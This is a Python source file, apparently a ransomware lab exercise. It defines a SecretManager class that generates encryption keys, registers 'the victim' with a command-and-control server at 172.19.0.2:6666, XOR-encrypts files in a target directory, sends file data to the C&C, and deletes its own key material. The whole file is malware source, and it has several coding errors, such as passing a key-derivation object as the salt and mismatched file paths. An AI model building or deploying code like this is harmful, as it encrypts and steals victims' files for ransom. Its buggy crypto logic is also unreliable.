from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    #CONSTANTS
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16
    TOKEN_PATH = "root/token"
    SALT_PATH = "root/salt"
    KEY_PATH = "root/key"

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        salt = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.SALT_LENGTH, salt=secrets.token_bytes(16), iterations=self.ITERATION)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.KEY_LENGTH, salt=salt, iterations=self.ITERATION)
        return kdf.derive(key), salt


    def create(self)->Tuple[bytes, bytes, bytes]:
        # create crypto data
        res = {
            "key": secrets.token_bytes(16),
            "salt": secrets.token_bytes(16),
            "token": secrets.token_bytes(16)
            }
            
        self._token = res["token"]
        self._salt = res["salt"]
        self._key = res["key"]
        return res


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        payload = {
            "token" : self.bin_to_b64(token),
            "salt"  : self.bin_to_b64(salt),
            "key"   : self.bin_to_b64(key)
        }
        requests.post("http://172.19.0.2:6666/new", json=payload)   

    

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        token= self.create()
        key , self.salt = self.do_derivation(self._salt, self._key) # derive key
        self._token = token
        self._key = key
        self.post_new(self._salt, self._key, self._token)
        # save crypto data in token.bin if not exist
        if not os.path.exists(os.path.join(self.TOKEN_PATH, "token.bin")):
            with open(os.path.join(self.TOKEN_PATH, "token.bin"), "wb") as f:
                f.write(self._token)
                self._log.info("token saved")
        # save crypto data in salt.bin if not exist
        if not os.path.exists(os.path.join(self.SALT_PATH, "salt.bin")):
            with open(os.path.join(self.SALT_PATH, "salt.bin"), "wb") as f:
                f.write(self._salt)
                self._log.info("salt saved")
        

    def load(self)->None:
        # function to load crypto data from the target
        with open(os.path.join(self.SALT_PATH, "salt"), "rb") as f: # load salt
            self._salt = f.read()
        with open(os.path.join(self.TOKEN_PATH, "token"), "rb") as f: # load token
            self._token = f.read()
        

    def check_key(self, candidate_key:bytes)->bool:
        # get the token 
        token = self.get_hex_token()
        # check if the token is valid
        if sha256(candidate_key).hexdigest() == token:
            return True
        else:
            return False
        

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        key = base64.b64decode(b64_key) # decode the key
        if self.check_key(key): # check if the key is valid
            self._key = key
        else:
            raise Exception("Invalid key") # raise an exception if the key is not valid
        

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        with open(os.path.join(self.TOKEN_PATH, "token.bin"), "rb") as f:
            token = f.read()
            # hash the token
            token = sha256(token).hexdigest()
        return token.hex()
        

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for f in files:
            xorfile(os.path.join(self._path, f), self._key)
    

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        data = files 
        requests.post("http://172.19.0.2:6666/files", json=data)
        return {"status": "ok"}
    

    def clean(self):
        # remove crypto data from the target
        os.remove(os.path.join(self.KEY_PATH, "key"))
        os.remove(os.path.join(self.SALT_PATH, "salt"))
        os.remove(os.path.join(self.TOKEN_PATH, "token"))

if __name__ == "__main__":
    # Test the class
    secret_manager = SecretManager()
    secret_manager.setup()
    secret_manager.xorfiles(["test.txt"])
    secret_manager.leak_files(["test.txt"])
    secret_manager.clean()
    